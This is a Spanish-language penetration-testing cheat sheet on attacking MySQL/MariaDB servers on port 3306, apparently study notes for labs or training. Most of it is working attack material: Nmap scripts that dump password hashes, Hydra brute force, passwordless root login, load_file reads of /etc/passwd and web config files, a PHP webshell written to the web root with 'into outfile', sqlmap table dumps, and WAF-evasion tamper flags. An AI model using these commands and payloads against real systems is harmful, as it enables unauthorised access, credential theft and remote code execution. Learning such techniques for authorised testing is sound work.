---
title: MySQL / MariaDB (Puerto 3306)
pubDate: '2026-08-26'
---

## ¿Qué es MySQL?
**MySQL** y su fork **MariaDB** son los sistemas de gestión de bases de datos relacionales más utilizados en aplicaciones web (Linux/LAMP). Es el corazón donde se almacenan usuarios, configuraciones y datos sensibles.

### Riesgos principales
1. **Inyección SQL:** Vulnerabilidades en la aplicación web que permiten ejecutar consultas arbitrarias.
2. **Credenciales Débiles:** Acceso root sin contraseña o con claves por defecto en entornos de desarrollo.
3. **Lectura de Archivos (LFI):** Capacidad de leer archivos del sistema operativo mediante funciones SQL (`load_file`).
4. **Escritura de Archivos (RCE):** Posibilidad de escribir una webshell en el disco si hay permisos adecuados (`into outfile`).

---

## ⚙️ Ficheros de Configuración y Directivas Críticas

### Ruta Clave: `/etc/mysql/mysql.conf.d/mysqld.cnf` o `/etc/my.cnf`
| Directiva | Descripción e Impacto de Seguridad |
| :--- | :--- |
| `user = mysql` | Usuario del sistema con el que se ejecuta el demonio MySQL. |
| `admin_address` | Dirección IP específica para conexiones administrativas restringidas. |
| `secure_file_priv` | Controla la exportación e importación de archivos (`load_file` / `into outfile`). Si está vacío (`""`), permite leer/escribir en cualquier directorio accesible por el usuario `mysql`. Si apunta a una ruta (ej. `/var/lib/mysql-files/`), limita las operaciones solo a esa carpeta. |
| `bind-address` | Interfaz de escucha (`127.0.0.1` solo local vs `0.0.0.0` expuesto en red). |

---

## 🔎 1. Enumeración y Scripts Nmap

```bash
# Scripts NSE de Nmap (Extracción de información, bases de datos y hashes)
nmap -sV -p 3306 --script=mysql-info,mysql-users,mysql-databases,mysql-empty-password,mysql-dump-hashes,mysql-brute <TARGET_IP>
```

### Fuerza Bruta (Hydra)
```bash
hydra -L users.txt -P passwords.txt mysql://<TARGET_IP>
```

---

## 🚀 2. Conexión e Interacción con el Servicio

```bash
# Conexión sin contraseña (acceso anónimo / root sin clave)
mysql -h <TARGET_IP> -u root

# Conexión con contraseña (NOTA: Sin espacio entre -p y la contraseña)
mysql -h <TARGET_IP> -u root -p'Password123'
mysql -h <TARGET_IP> -u root -p
```

### Consultas Esenciales en la Consola SQL:
```sql
select version();                                    -- Ver versión exacta del motor
show databases;                                      -- Listar todas las bases de datos
use <nombre_db>;                                     -- Seleccionar base de datos
show tables;                                         -- Ver tablas disponibles
describe <tabla>;                                    -- Ver estructura y tipos de columnas
show columns from <tabla>;                           -- Mostrar columnas detalladas
select * from <tabla>;                               -- Volcar contenido de una tabla
select * from <tabla> where <columna> = "admin";     -- Búsqueda filtrada
select user, host, password from mysql.user;         -- Listar usuarios y hashes de contraseña (MySQL 5.7)
select user, host, authentication_string from mysql.user; -- Hashes en MySQL 8.0+
```

---

## 🧨 3. Vectores de Explotación

### 1. Lectura de archivos del sistema (LFI)
Si el usuario de la DB tiene permisos y `secure_file_priv` lo permite:
```sql
select load_file("/etc/passwd");
select load_file("/var/www/html/config.php");
```

### 2. Escritura de archivos (RCE / WebShell)
Si conocemos la ruta raíz del servidor web y tenemos privilegios `FILE`:
```sql
select "<?php system($_GET['c']); ?>" into outfile "/var/www/html/shell.php";
```

---

## 🎯 4. SQLMap (Automatización)

### Flujo de Trabajo Recomendado
1. **Listar Bases de Datos:**
   ```bash
   sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
   ```
2. **Listar Tablas de una base de datos específica:**
   ```bash
   sqlmap -u "http://target.com/page.php?id=1" -D <db_name> --tables --batch
   ```
3. **Extraer datos de una tabla:**
   ```bash
   sqlmap -u "http://target.com/page.php?id=1" -D <db_name> -T <table_name> --dump --batch
   ```

> **Tip de Evasión WAF:** Utiliza `--random-agent` para rotar el User-Agent y `--tamper=space2comment` para ofuscar espacios y eludir firewalls web.
